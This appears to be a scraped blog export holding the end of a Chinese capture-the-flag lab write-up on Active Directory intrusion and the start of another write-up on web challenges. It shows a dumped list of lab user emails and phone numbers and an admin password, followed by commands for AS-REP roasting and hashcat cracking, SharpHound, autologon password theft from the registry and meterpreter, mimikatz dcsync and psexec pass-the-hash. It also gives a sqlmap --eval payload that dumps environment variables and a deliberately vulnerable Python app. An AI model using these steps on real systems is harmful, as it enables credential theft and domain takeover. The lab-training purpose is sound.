SHU SHI |\r| 250 | fuyi@xiaorang.lab | 18902082658 | FU YI |\r| 251 | pangcheng@xiaorang.lab | 18823789530 | PANG CHENG |\r| 252 | tonghao@xiaorang.lab | 13370873526 | TONG HAO |\r| 253 | jiaoshan@xiaorang.lab | 15375905173 | JIAO SHAN |\r| 254 | dulun@xiaorang.lab | 13352331157 | DU LUN |\r| 255 | kejuan@xiaorang.lab | 13222550481 | KE JUAN |\r| 256 | gexin@xiaorang.lab | 18181553086 | GE XIN |\r| 257 | lugu@xiaorang.lab | 18793883130 | LU GU |\r| 258 | guzaicheng@xiaorang.lab | 15309377043 | GU ZAI CHENG |\r| 259 | feicai@xiaorang.lab | 13077435367 | FEI CAI |\r| 260 | ranqun@xiaorang.lab | 18239164662 | RAN QUN |\r| 261 | zhouyi@xiaorang.lab | 13169264671 | ZHOU YI |\r| 262 | shishu@xiaorang.lab | 18592890189 | SHI SHU |\r| 263 | yanyun@xiaorang.lab | 15071085768 | YAN YUN |\r| 264 | chengqiu@xiaorang.lab | 13370162980 | CHENG QIU |\r| 265 | louyou@xiaorang.lab | 13593582379 | LOU YOU |\r| 266 | maqun@xiaorang.lab | 15235945624 | MA QUN |\r| 267 | wenbiao@xiaorang.lab | 13620643639 | WEN BIAO |\r| 268 | weishengshan@xiaorang.lab | 18670502260 | WEI SHENG SHAN |\r| 269 | zhangxin@xiaorang.lab | 15763185760 | ZHANG XIN |\r| 270 | chuyuan@xiaorang.lab | 18420545268 | CHU YUAN |\r| 271 | wenliang@xiaorang.lab | 13601678032 | WEN LIANG |\r| 272 | yulvxue@xiaorang.lab | 18304374901 | YU LV XUE |\r| 273 | luyue@xiaorang.lab | 18299785575 | LU YUE |\r| 274 | ganjian@xiaorang.lab | 18906111021 | GAN JIAN |\r| 275 | pangzhen@xiaorang.lab | 13479328562 | PANG ZHEN |\r| 276 | guohong@xiaorang.lab | 18510220597 | GUO HONG |\r| 277 | lezhong@xiaorang.lab | 15320909285 | LE ZHONG |\r| 278 | sheweiyue@xiaorang.lab | 13736399596 | SHE WEI YUE |\r| 279 | dujian@xiaorang.lab | 15058892639 | DU JIAN |\r| 280 | lidongjin@xiaorang.lab | 18447207007 | LI DONG JIN |\r| 281 | hongqun@xiaorang.lab | 15858462251 | HONG QUN |\r| 282 | yexing@xiaorang.lab | 13719043564 | YE XING |\r| 283 | maoda@xiaorang.lab | 13878840690 | MAO DA |\r| 284 | qiaomei@xiaorang.lab | 13053207462 | QIAO MEI |\r| 285 | nongzhen@xiaorang.lab | 15227699960 | NONG ZHEN |\r| 286 | dongshu@xiaorang.lab | 15695562947 | DONG SHU |\r| 287 | zhuzhu@xiaorang.lab | 13070163385 | ZHU ZHU |\r| 288 | jiyun@xiaorang.lab | 13987332999 | JI YUN |\r| 289 | qiguanrou@xiaorang.lab | 15605983582 | QI GUAN ROU |\r| 290 | yixue@xiaorang.lab | 18451603140 | YI XUE |\r| 291 | chujun@xiaorang.lab | 15854942459 | CHU JUN |\r| 292 | shenshan@xiaorang.lab | 17712052191 | SHEN SHAN |\r| 293 | lefen@xiaorang.lab | 13271196544 | LE FEN |\r| 294 | yubo@xiaorang.lab | 13462202742 | YU BO |\r| 295 | helianrui@xiaorang.lab | 15383000907 | HE LIAN RUI |\r| 296 | xuanqun@xiaorang.lab | 18843916267 | XUAN QUN |\r| 297 | shangjun@xiaorang.lab | 15162486698 | SHANG JUN |\r| 298 | huguang@xiaorang.lab | 18100586324 | HU GUANG |\r| 299 | wansifu@xiaorang.lab | 18494761349 | WAN SI FU |\r| 300 | fenghong@xiaorang.lab | 13536727314 | FENG HONG |\r| 301 | wanyan@xiaorang.lab | 17890844429 | WAN YAN |\r| 302 | diyan@xiaorang.lab | 18534028047 | DI YAN |\r| 303 | xiangyu@xiaorang.lab | 13834043047 | XIANG YU |\r| 304 | songyan@xiaorang.lab | 15282433280 | SONG YAN |\r| 305 | fandi@xiaorang.lab | 15846960039 | FAN DI |\r| 306 | xiangjuan@xiaorang.lab | 18120327434 | XIANG JUAN |\r| 307 | beirui@xiaorang.lab | 18908661803 | BEI RUI |\r| 308 | didi@xiaorang.lab | 13413041463 | DI DI |\r| 309 | zhubin@xiaorang.lab | 15909558554 | ZHU BIN |\r| 310 | lingchun@xiaorang.lab | 13022790678 | LING CHUN |\r| 311 | zhenglu@xiaorang.lab | 13248244873 | ZHENG LU |\r| 312 | xundi@xiaorang.lab | 18358493414 | XUN DI |\r| 313 | wansishun@xiaorang.lab | 18985028319 | WAN SI SHUN |\r| 314 | yezongyue@xiaorang.lab | 13866302416 | YE ZONG YUE |\r| 315 | bianmei@xiaorang.lab | 18540879992 | BIAN MEI |\r| 316 | shanshao@xiaorang.lab | 18791488918 | SHAN SHAO |\r| 317 | zhenhui@xiaorang.lab | 13736784817 | ZHEN HUI |\r| 318 | chengli@xiaorang.lab | 15913267394 | CHENG LI |\r| 319 | yufen@xiaorang.lab | 18432795588 | YU FEN |\r| 320 | jiyi@xiaorang.lab | 13574211454 | JI YI |\r| 321 | panbao@xiaorang.lab | 13675851303 | PAN BAO |\r| 322 | mennane@xiaorang.lab | 15629706208 | MEN NAN E |\r| 323 | fengsi@xiaorang.lab | 13333432577 | FENG SI |\r| 324 | mingyan@xiaorang.lab | 18296909463 | MING YAN |\r| 325 | luoyou@xiaorang.lab | 15759321415 | LUO YOU |\r| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |\r| 327 | nongyan@xiaorang.lab | 18097386975 | NONG YAN |\r| 328 | haolun@xiaorang.lab | 15152700465 | HAO LUN |\r| 329 | oulun@xiaorang.lab | 13402760696 | OU LUN |\r| 330 | weichipeng@xiaorang.lab | 18057058937 | WEI CHI PENG |\r| 331 | qidiaofang@xiaorang.lab | 18728297829 | QI DIAO FANG |\r| 332 | xuehe@xiaorang.lab | 13398862169 | XUE HE |\r| 333 | chensi@xiaorang.lab | 18030178713 | CHEN SI |\r| 334 | guihui@xiaorang.lab | 17882514129 | GUI HUI |\r| 335 | fuyue@xiaorang.lab | 18298436549 | FU YUE |\r| 336 | wangxing@xiaorang.lab | 17763645267 | WANG XING |\r| 337 | zhengxiao@xiaorang.lab | 18673968392 | ZHENG XIAO |\r| 338 | guhui@xiaorang.lab | 15166711352 | GU HUI |\r| 339 | baoai@xiaorang.lab | 15837430827 | BAO AI |\r| 340 | hangzhao@xiaorang.lab | 13235488232 | HANG ZHAO |\r| 341 | xingye@xiaorang.lab | 13367587521 | XING YE |\r| 342 | qianyi@xiaorang.lab | 18657807767 | QIAN YI |\r| 343 | xionghong@xiaorang.lab | 17725874584 | XIONG HONG |\r| 344 | zouqi@xiaorang.lab | 15300430128 | ZOU QI |\r| 345 | rongbiao@xiaorang.lab | 13034242682 | RONG BIAO |\r| 346 | gongxin@xiaorang.lab | 15595839880 | GONG XIN |\r| 347 | luxing@xiaorang.lab | 18318675030 | LU XING |\r| 348 | huayan@xiaorang.lab | 13011805354 | HUA YAN |\r| 349 | duyue@xiaorang.lab | 15515878208 | DU YUE |\r| 350 | xijun@xiaorang.lab | 17871583183 | XI JUN |\r| 351 | daiqing@xiaorang.lab | 18033226216 | DAI QING |\r| 352 | yingbiao@xiaorang.lab | 18633421863 | YING BIAO |\r| 353 | hengteng@xiaorang.lab | 15956780740 | HENG TENG |\r| 354 | changwu@xiaorang.lab | 15251485251 | CHANG WU |\r| 355 | chengying@xiaorang.lab | 18788248715 | CHENG YING |\r| 356 | luhong@xiaorang.lab | 17766091079 | LU HONG |\r| 357 | tongxue@xiaorang.lab | 18466102780 | TONG XUE |\r| 358 | xiangqian@xiaorang.lab | 13279611385 | XIANG QIAN |\r| 359 | shaokang@xiaorang.lab | 18042645434 | SHAO KANG |\r| 360 | nongzhu@xiaorang.lab | 13934236634 | NONG ZHU |\r| 361 | haomei@xiaorang.lab | 13406913218 | HAO MEI |\r| 362 | maoqing@xiaorang.lab | 15713298425 | MAO QING |\r| 363 | xiai@xiaorang.lab | 18148404789 | XI AI |\r| 364 | bihe@xiaorang.lab | 13628593791 | BI HE |\r| 365 | gaoli@xiaorang.lab | 15814408188 | GAO LI |\r| 366 | jianggong@xiaorang.lab | 15951118926 | JIANG GONG |\r| 367 | pangning@xiaorang.lab | 13443921700 | PANG NING |\r| 368 | ruishi@xiaorang.lab | 15803112819 | RUI SHI |\r| 369 | wuhuan@xiaorang.lab | 13646953078 | WU HUAN |\r| 370 | qiaode@xiaorang.lab | 13543564200 | QIAO DE |\r| 371 | mayong@xiaorang.lab | 15622971484 | MA YONG |\r| 372 | hangda@xiaorang.lab | 15937701659 | HANG DA |\r| 373 | changlu@xiaorang.lab | 13734991654 | CHANG LU |\r| 374 | liuyuan@xiaorang.lab | 15862054540 | LIU YUAN |\r| 375 | chenggu@xiaorang.lab | 15706685526 | CHENG GU |\r| 376 | shentuyun@xiaorang.lab | 15816902379 | SHEN TU YUN |\r| 377 | zhuangsong@xiaorang.lab | 17810274262 | ZHUANG SONG |\r| 378 | chushao@xiaorang.lab | 18822001640 | CHU SHAO |\r| 379 | heli@xiaorang.lab | 13701347081 | HE LI |\r| 380 | haoming@xiaorang.lab | 15049615282 | HAO MING |\r| 381 | xieyi@xiaorang.lab | 17840660107 | XIE YI |\r| 382 | shangjie@xiaorang.lab | 15025010410 | SHANG JIE |\r| 383 | situxin@xiaorang.lab | 18999728941 | SI TU XIN |\r| 384 | linxi@xiaorang.lab | 18052976097 | LIN XI |\r| 385 | zoufu@xiaorang.lab | 15264535633 | ZOU FU |\r| 386 | qianqing@xiaorang.lab | 18668594658 | QIAN QING |\r| 387 | qiai@xiaorang.lab | 18154690198 | QI AI |\r| 388 | ruilin@xiaorang.lab | 13654483014 | RUI LIN |\r| 389 | luomeng@xiaorang.lab | 15867095032 | LUO MENG |\r| 390 | huaren@xiaorang.lab | 13307653720 | HUA REN |\r| 391 | yanyangmei@xiaorang.lab | 15514015453 | YAN YANG MEI |\r| 392 | zuofen@xiaorang.lab | 15937087078 | ZUO FEN |\r| 393 | manyuan@xiaorang.lab | 18316106061 | MAN YUAN |\r| 394 | yuhui@xiaorang.lab | 18058257228 | YU HUI |\r| 395 | sunli@xiaorang.lab | 18233801124 | SUN LI |\r| 396 | guansixin@xiaorang.lab | 13607387740 | GUAN SI XIN |\r| 397 | ruisong@xiaorang.lab | 13306021674 | RUI SONG |\r| 398 | qiruo@xiaorang.lab | 13257810331 | QI RUO |\r| 399 | jinyu@xiaorang.lab | 18565922652 | JIN YU |\r| 400 | shoujuan@xiaorang.lab | 18512174415 | SHOU JUAN |\r| 401 | yanqian@xiaorang.lab | 13799789435 | YAN QIAN |\r| 402 | changyun@xiaorang.lab | 18925015029 | CHANG YUN |\r| 403 | hualu@xiaorang.lab | 13641470801 | HUA LU |\r| 404 | huanming@xiaorang.lab | 15903282860 | HUAN MING |\r| 405 | baoshao@xiaorang.lab | 13795275611 | BAO SHAO |\r| 406 | hongmei@xiaorang.lab | 13243605925 | HONG MEI |\r| 407 | manyun@xiaorang.lab | 13238107359 | MAN YUN |\r| 408 | changwan@xiaorang.lab | 13642205622 | CHANG WAN |\r| 409 | wangyan@xiaorang.lab | 13242486231 | WANG YAN |\r| 410 | shijian@xiaorang.lab | 15515077573 | SHI JIAN |\r| 411 | ruibei@xiaorang.lab | 18157706586 | RUI BEI |\r| 412 | jingshao@xiaorang.lab | 18858376544 | JING SHAO |\r| 413 | jinzhi@xiaorang.lab | 18902437082 | JIN ZHI |\r| 414 | yuhui@xiaorang.lab | 15215599294 | YU HUI |\r| 415 | zangpeng@xiaorang.lab | 18567574150 | ZANG PENG |\r| 416 | changyun@xiaorang.lab | 15804640736 | CHANG YUN |\r| 417 | yetai@xiaorang.lab | 13400150018 | YE TAI |\r| 418 | luoxue@xiaorang.lab | 18962643265 | LUO XUE |\r| 419 | moqian@xiaorang.lab | 18042706956 | MO QIAN |\r| 420 | xupeng@xiaorang.lab | 15881934759 | XU PENG |\r| 421 | ruanyong@xiaorang.lab | 15049703903 | RUAN YONG |\r| 422 | guliangxian@xiaorang.lab | 18674282714 | GU LIANG XIAN |\r| 423 | yinbin@xiaorang.lab | 15734030492 | YIN BIN |\r| 424 | huarui@xiaorang.lab | 17699257041 | HUA RUI |\r| 425 | niuya@xiaorang.lab | 13915041589 | NIU YA |\r| 426 | guwei@xiaorang.lab | 13584571917 | GU WEI |\r| 427 | qinguan@xiaorang.lab | 18427953434 | QIN GUAN |\r| 428 | yangdanhan@xiaorang.lab | 15215900100 | YANG DAN HAN |\r| 429 | yingjun@xiaorang.lab | 13383367818 | YING JUN |\r| 430 | weiwan@xiaorang.lab | 13132069353 | WEI WAN |\r| 431 | sunduangu@xiaorang.lab | 15737981701 | SUN DUAN GU |\r| 432 | sisiwu@xiaorang.lab | 18021600640 | SI SI WU |\r| 433 | nongyan@xiaorang.lab | 13312613990 | NONG YAN |\r| 434 | xuanlu@xiaorang.lab | 13005748230 | XUAN LU |\r| 435 | yunzhong@xiaorang.lab | 15326746780 | YUN ZHONG |\r| 436 | gengfei@xiaorang.lab | 13905027813 | GENG FEI |\r| 437 | zizhuansong@xiaorang.lab | 13159301262 | ZI ZHUAN SONG |\r| 438 | ganbailong@xiaorang.lab | 18353612904 | GAN BAI LONG |\r| 439 | shenjiao@xiaorang.lab | 15164719751 | SHEN JIAO |\r| 440 | zangyao@xiaorang.lab | 18707028470 | ZANG YAO |\r| 441 | yangdanhe@xiaorang.lab | 18684281105 | YANG DAN HE |\r| 442 | chengliang@xiaorang.lab | 13314617161 | CHENG LIANG |\r| 443 | xudi@xiaorang.lab | 18498838233 | XU DI |\r| 444 | wulun@xiaorang.lab | 18350490780 | WU LUN |\r| 445 | yuling@xiaorang.lab | 18835870616 | YU LING |\r| 446 | taoya@xiaorang.lab | 18494928860 | TAO YA |\r| 447 | jinle@xiaorang.lab | 15329208123 | JIN LE |\r| 448 | youchao@xiaorang.lab | 13332964189 | YOU CHAO |\r| 449 | liangduanzhi@xiaorang.lab | 15675237494 | LIANG DUAN ZHI |\r| 450 | jiagupiao@xiaorang.lab | 17884962455 | JIA GU PIAO |\r| 451 | ganze@xiaorang.lab | 17753508925 | GAN ZE |\r| 452 | jiangqing@xiaorang.lab | 15802357200 | JIANG QING |\r| 453 | jinshan@xiaorang.lab | 13831466303 | JIN SHAN |\r| 454 | zhengpubei@xiaorang.lab | 13690156563 | ZHENG PU BEI |\r| 455 | cuicheng@xiaorang.lab | 17641589842 | CUI CHENG |\r| 456 | qiyong@xiaorang.lab | 13485427829 | QI YONG |\r| 457 | qizhu@xiaorang.lab | 18838859844 | QI ZHU |\r| 458 | ganjian@xiaorang.lab | 18092585003 | GAN JIAN |\r| 459 | yurui@xiaorang.lab | 15764121637 | YU RUI |\r| 460 | feishu@xiaorang.lab | 18471512248 | FEI SHU |\r| 461 | chenxin@xiaorang.lab | 13906545512 | CHEN XIN |\r| 462 | shengzhe@xiaorang.lab | 18936457394 | SHENG ZHE |\r| 463 | wohong@xiaorang.lab | 18404022650 | WO HONG |\r| 464 | manzhi@xiaorang.lab | 15973350408 | MAN ZHI |\r| 465 | xiangdong@xiaorang.lab | 13233908989 | XIANG DONG |\r| 466 | weihui@xiaorang.lab | 15035834945 | WEI HUI |\r| 467 | xingquan@xiaorang.lab | 18304752969 | XING QUAN |\r| 468 | miaoshu@xiaorang.lab | 15121570939 | MIAO SHU |\r| 469 | gongwan@xiaorang.lab | 18233990398 | GONG WAN |\r| 470 | qijie@xiaorang.lab | 15631483536 | QI JIE |\r| 471 | shaoting@xiaorang.lab | 15971628914 | SHAO TING |\r| 472 | xiqi@xiaorang.lab | 18938747522 | XI QI |\r| 473 | jinghong@xiaorang.lab | 18168293686 | JING HONG |\r| 474 | qianyou@xiaorang.lab | 18841322688 | QIAN YOU |\r| 475 | chuhua@xiaorang.lab | 15819380754 | CHU HUA |\r| 476 | yanyue@xiaorang.lab | 18702474361 | YAN YUE |\r| 477 | huangjia@xiaorang.lab | 13006878166 | HUANG JIA |\r| 478 | zhouchun@xiaorang.lab | 13545820679 | ZHOU CHUN |\r| 479 | jiyu@xiaorang.lab | 18650881187 | JI YU |\r| 480 | wendong@xiaorang.lab | 17815264093 | WEN DONG |\r| 481 | heyuan@xiaorang.lab | 18710821773 | HE YUAN |\r| 482 | mazhen@xiaorang.lab | 18698248638 | MA ZHEN |\r| 483 | shouchun@xiaorang.lab | 15241369178 | SHOU CHUN |\r| 484 | liuzhe@xiaorang.lab | 18530936084 | LIU ZHE |\r| 485 | fengbo@xiaorang.lab | 15812110254 | FENG BO |\r| 486 | taigongyuan@xiaorang.lab | 15943349034 | TAI GONG YUAN |\r| 487 | gesheng@xiaorang.lab | 18278508909 | GE SHENG |\r| 488 | songming@xiaorang.lab | 13220512663 | SONG MING |\r| 489 | yuwan@xiaorang.lab | 15505678035 | YU WAN |\r| 490 | diaowei@xiaorang.lab | 13052582975 | DIAO WEI |\r| 491 | youyi@xiaorang.lab | 18036808394 | YOU YI |\r| 492 | rongxianyu@xiaorang.lab | 18839918955 | RONG XIAN YU |\r| 493 | fuyi@xiaorang.lab | 15632151678 | FU YI |\r| 494 | linli@xiaorang.lab | 17883399275 | LIN LI |\r| 495 | weixue@xiaorang.lab | 18672465853 | WEI XUE |\r| 496 | hejuan@xiaorang.lab | 13256081102 | HE JUAN |\r| 497 | zuoqiutai@xiaorang.lab | 18093001354 | ZUO QIU TAI |\r| 498 | siyi@xiaorang.lab | 17873307773 | SI YI |\r| 499 | shenshan@xiaorang.lab | 18397560369 | SHEN SHAN |\r| 500 | tongdong@xiaorang.lab | 15177549595 | TONG DONG |\r+-----+----------------------------+-------------+-----------------+ oa管理员账户密码\n[1 entry]\r+----+------------------+---------------+\r| id | password | username |\r+----+------------------+---------------+\r| 1 | bo2y8kAL3HnXUiQo | administrator |\r+----+------------------+---------------+ FLAG3\u0026amp;FLAG4 AS-REPRoasting 拿到这堆user信息我们大概可以猜到要打AS-REPRoasting了\n先把这堆用户整理成一个用户字典user.txt\n我们可以通过impacket-GetNPUsers工具进行枚举，收集配置了“不需要预身份验证”的用户\nproxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/ 可以拿到两个用户的TGT票据\n$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c\r$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1 用hashcat爆破出明文密码，用的kali自带的rockyou字典\nhashcat -m 18200 --force -a 0 \u0026#39;$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:c1f3f661b3e13330c72d06c7ae0e4d8b$06839251bdb7f64fbbc06a0e5c73e05358b593b2587eed530276c24ca0e501b8f33c6e7470a30b8f79f3ada9fafedffd1c6c8b10ac449b6289795b3a30985083d1a1b00a3c6a23cf472db6575c8f836180245a35e425c9ed4985162c24950736f5c5e12328ae6e9265efe926b557e20845cb2ef42f3f32d8ee5ac4158a15141f5d53d474f038a110dde7e0b5456be545ea06c816f0e4913472d60b933ffe84fc9be9b1a27f10288ff380f7036917c2ca23862f39eee7cecd0d3d1bedcef9460d7f5892a0b76a86ac2cd89cb6cd507e0aaea0ed8b3c23abe282a7bcd4e3ebee77f435544a44e0bd36ddc5216c\u0026#39; ./rockyou.txt\rhashcat -m 18200 --force -a 0 \u0026#39;$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:a2f5e2962c4db2de2d110097bb1ef50d$a60eb578bc52da54562468ba1462571da414c4a22c7c2b688c791817177f765784b98293edc52e12694b4423f889d704712b550702657f6383597bc071fd91c853f1e16880fc637e68d675aa35c99d7e260e33dea1651390d26ddf99fb075a0be1bfbab3987431e29318a91b7102145836ca8512ea412c1dab398c6f1f11843c2c1624fe5c18876acc73f5d36560380994bac604a00356b7fcde8ac03b36d4a9e79d00cd60996c7211d6b339af8eaddd1b69d2a319e565653b958079a2d5d7f528ec641c8f4fc4c7fdf582a7b6e881ed5f88273a6e31ccf711d0259ad3bc80e5d539191d73c12a5d836880a1\u0026#39; ./rockyou.txt wenshao@xiaorang.lab/hellokitty\rzhangxin@xiaorang.lab/strawberry 尝试rdp到172.22.6.12\n发现没授权远程登录\n但是另一台机子172.22.6.25是可以登上的，但是拿不到flag\n我们先信息收集一手\n传一个SharpHound\nSharpHound.exe -c all Find Shortest Paths to Domain Admins\n可以看到yuxuan这个用户有SIDHistory，也就是说相当于是域管\n所有我们下一个目标就是要拿下yuxuan这个用户\n而且yuxuan这个用户在172.22.6.25上拥有会话。（HasSession）\n用户与计算机时进行会话时，凭据会保留在内存中。说明用户登陆过该主机。\nHasSession 方法一 直接查注册表，可以看到yuxuan这个账户设置了自动登录，而且能拿到明文密码\nreg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; 在 Windows 系统中，域用户自动登录的相关设置保存在注册表中。具体路径为 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon。若该路径下存在 AutoAdminLogon 键值且其数据数值为 1，同时 DefaultDomainName DefaultUserName DefaultPassword 等键值也有相应的正确设置，那么说明该域用户设置了自动登录。\nyuxuan/Yuxuan7QbrgZ3L 方法二 小豌豆信息收集一手就能抓到\n方法三 用户设置了自动登录可以用msf抓取自动登录的账户密码\nmsf生成一个正向代理的shell，在靶机上运行\nmsfvenom -p windows/meterpreter/bind_tcp -f exe -o 1.exe 接着用msf连上去\nuse exploit/multi/handler\rset payload windows/meterpreter/bind_tcp\rset rhost 172.22.6.25\rrun 抓自动登录的账号密码\nmeterpreter \u0026gt; run windows/gather/credentials/windows_autologin HasSIDHistory SID History是在域迁移过程中需要使用的一个属性。\n如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。\nSID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源\n域权限维持-SID History - xiaoxiaosen - 博客园\n拿到明文密码我们直接rdp上去\n因为有SID History这个用户可以访问域管的资源，所以我们可以直接拿mimikatz去dump域管的hash\nlsadump::dcsync /domain:xiaorang.lab /all /csv 拿到域管的hash\n500 Administrator 04d93ffd6f5f6e4490e0de23f240a5e9 512 接下来我们就可以PTH拿flag了\nproxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.12 C:\\Windows\\system32\u0026gt; type c:\\Users\\Administrator\\flag\\flag04.txt\rAwesome! you got the final flag.\r:::::::::::::::::::::::::: :::: ::::::::::\r:+: :+: +:+:+: :+:+:+:+:\r+:+ +:+ +:+ +:+:+ +:++:+\r+#+ +#+ +#+ +:+ +#++#++:++#\r+#+ +#+ +#+ +#++#+\r#+# #+# #+# #+##+#\r### ############## #############\rflag04: flag{26180e6b-5b97-47ca-a861-a160ef12166c} proxychains4 -q psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip 172.22.6.25 C:\\Windows\\system32\u0026gt; type c:\\Users\\Administrator\\flag\\flag03.txt\rflag03: flag{ff39758a-623e-4f1f-b0bb-bb5f6d31ca83}\rMaybe you can find something interesting on this server.\r=======================================\rWhat you may not know is that many objects in this domain\rare moved from other domains. ","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/","summary":"\u003cp\u003e\u003cem\u003e靶标介绍：\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Time-Writeup"},{"content":"sqlmap-master 题目\n1from fastapi import FastAPI, Request 2from fastapi.responses import FileResponse, StreamingResponse 3import subprocess 4 5app = FastAPI() 6 7@app.get(\u0026#34;/\u0026#34;) 8async def index(): 9 return FileResponse(\u0026#34;index.html\u0026#34;) 10 11@app.post(\u0026#34;/run\u0026#34;) 12async def run(request: Request): 13 data = await request.json() 14 url = data.get(\u0026#34;url\u0026#34;) 15 16 if not url: 17 return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} 18 19 command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; 20 21 def generate(): 22 process = subprocess.Popen( 23 command.split(), 24 stdout=subprocess.PIPE, 25 stderr=subprocess.STDOUT, 26 shell=False 27 ) 28 29 while True: 30 output = process.stdout.readline() 31 if output == \u0026#39;\u0026#39; and process.poll() is not None: 32 break 33 if output: 34 yield output 35 36 return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 其实就是一个网页端的sqlmap\n看一下sqlmap的使用文档\n可以通过\u0026ndash;eval执行python代码，而且有回显\npayload\n127.0.0.1 --eval=print(__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;env\u0026#34;).read()) ez_dash 题目\n1\u0026#39;\u0026#39;\u0026#39; 2Hints: Flag在环境变量中 3\u0026#39;\u0026#39;\u0026#39; 4 5 6from typing import Optional 7 8 9import pydash 10import bottle 11 12 13 14__forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, 15 \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, 16 \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, 17 \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, 18 \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, 19 \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, 20 \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, 21 \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, 22 \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, 23 \u0026#34;Optional\u0026#34;,\u0026#34;func\u0026#34;,\u0026#34;render\u0026#34;, 24 ] 25__forbidden_name__=[ 26 \u0026#34;bottle\u0026#34; 27] 28__forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) 29 30def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: 31 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False 32 for word in __forbidden_name__: 33 if name==word: 34 return False 35 for word in __forbidden_path__: 36 if path.find(word)\u0026gt;=0: return False 37 obj=globals()[name] 38 try: 39 pydash.set_(obj,path,value) 40 except: 41 return False 42 return True 43 44@bottle.post(\u0026#39;/setValue\u0026#39;) 45def set_value(): 46 name = bottle.request.query.get(\u0026#39;name\u0026#39;) 47 path=bottle.request.json.get(\u0026#39;path\u0026#39;) 48 if not isinstance(path,str): 49 return \u0026#34;no\u0026#34; 50 if len(name)\u0026gt;6 or len(path)\u0026gt;32: 51 return \u0026#34;no\u0026#34; 52 value=bottle.request.json.get(\u0026#39;value\u0026#39;) 53 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; 54 55@bottle.get(\u0026#39;/render\u0026#39;) 56def render_template(): 57 path=bottle.request.query.get(\u0026#39;path\u0026#39;) 58 if path.find(\u0026#34;{\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;}\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;.\u0026#34;)\u0026gt;=0: 59 return \u0026#34;Hacker\u0026#34; 60 return bottle.template(path) 